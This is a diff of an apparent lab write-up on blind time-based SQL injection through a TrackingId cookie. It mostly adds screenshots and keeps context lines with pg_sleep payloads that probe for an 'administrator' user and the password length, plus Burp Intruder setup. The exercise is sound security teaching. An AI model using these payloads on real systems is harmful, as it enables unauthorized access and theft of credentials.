@@ -48,6 +48,9 @@ Replace the cookie value with:
 
 ---
 
+<img width="1276" height="713" alt="Screenshot 2026-08-09 at 10 58 35 AM" src="https://github.com/user-attachments/assets/4ef546a6-6c83-40fa-99e5-a82791ffdff9" />
+
+
 Modify the cookie to:
 
 
@@ -105,6 +108,9 @@ or
 ```
 TrackingId=x' ||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
 ```
+
+<img width="1279" height="770" alt="Screenshot 2026-08-09 at 10 59 30 AM" src="https://github.com/user-attachments/assets/8dc555fe-52a2-46a9-980f-b363a6b1fe8c" />
+
 
 # The core idea
 
@@ -298,6 +304,9 @@ That's the foundation of the attack.
 
 ---
 
+<img width="1276" height="718" alt="Screenshot 2026-08-09 at 11 01 12 AM" src="https://github.com/user-attachments/assets/b2ed6cb5-c9ae-4406-9bc6-b36b93ae030b" />
+
+
 # Step 5 — Test whether administrator exists
 
 Now replace the simple condition:
@@ -315,7 +324,7 @@ username='administrator'
 Payload:
 
 ```text
-TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+TrackingId=x'%3BSELECT+CASE+WHEN (username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```
 
 Decoded:
@@ -367,6 +376,9 @@ administrator exists
 
 ---
 
+<img width="1275" height="713" alt="Screenshot 2026-08-09 at 11 02 03 AM" src="https://github.com/user-attachments/assets/e344cff6-6b97-4542-b149-27423d04a492" />
+
+
 # Step 6 — Test password length
 
 Now the condition becomes:
@@ -412,6 +424,9 @@ Therefore:
 ~10 seconds
 ```
 
+<img width="1278" height="717" alt="Screenshot 2026-08-09 at 11 03 12 AM" src="https://github.com/user-attachments/assets/18d59831-4ff1-4603-8da3-f716d9c50148" />
+
+
 ---
 # Step 7- Use Burp Intruder
 Testing every character manually would be slow.
@@ -430,6 +445,11 @@ TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>
 ```
 
 The §...§ markers tell Intruder where to insert payloads.
+
+<img width="1278" height="767" alt="Screenshot 2026-08-09 at 10 47 46 AM" src="https://github.com/user-attachments/assets/2f6ad0c8-745b-4449-b282-360f0922c7a5" />
+
+<img width="1276" height="739" alt="Screenshot 2026-08-09 at 10 47 21 AM" src="https://github.com/user-attachments/assets/10e23eac-dc52-4364-96c9-b44e81500804" />
+
 
 # Step 8: Configure Payloads
 Choose Payload type: Numbers
@@ -508,6 +528,10 @@ z
 ```
 
 ---
+
+<img width="1277" height="766" alt="Screenshot 2026-08-09 at 10 55 09 AM" src="https://github.com/user-attachments/assets/7c384192-25ed-43a8-bad8-9a558d1f36e3" />
+
+<img width="1277" height="717" alt="Screenshot 2026-08-09 at 10 54 02 AM" src="https://github.com/user-attachments/assets/3b82acd0-3fbd-411d-9b8b-cafd39fc4d76" />
 
 
 # How to recognize the correct character
